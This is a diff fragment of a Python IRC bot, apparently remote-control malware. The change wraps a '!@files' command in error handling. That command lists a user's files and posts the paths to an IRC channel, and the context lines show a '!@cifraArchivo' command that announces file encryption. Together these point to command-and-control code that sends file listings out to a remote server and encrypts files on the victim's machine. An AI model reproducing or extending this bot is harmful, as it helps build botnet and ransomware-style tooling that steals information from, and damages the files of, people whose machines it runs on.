@@ -187,9 +187,12 @@ while 1:
 			irc.send("PRIVMSG "+channel+" %s\r\n" %user)
 	if msg.find("!@files")!=-1:
 		user = msg.split(' ')[4]
-		FilesWithPath = files(user[:-2])
-		for file in FilesWithPath:
-			irc.send("PRIVMSG "+channel+" %s\r\n" %file)
+		try:
+			FilesWithPath = files(user[:-2])
+			for file in FilesWithPath:
+				irc.send("PRIVMSG "+channel+" %s\r\n" %file)
+		except Exception:
+			irc.send("PRIVMSG "+channel+" :El usuario no fue especificado\r\n")
 	if msg.find("!@cifraArchivo") != -1:
 		irc.send("PRIVMSG "+channel+" :Cifrando...\r\n")
 		msg2=msg.split(' ')
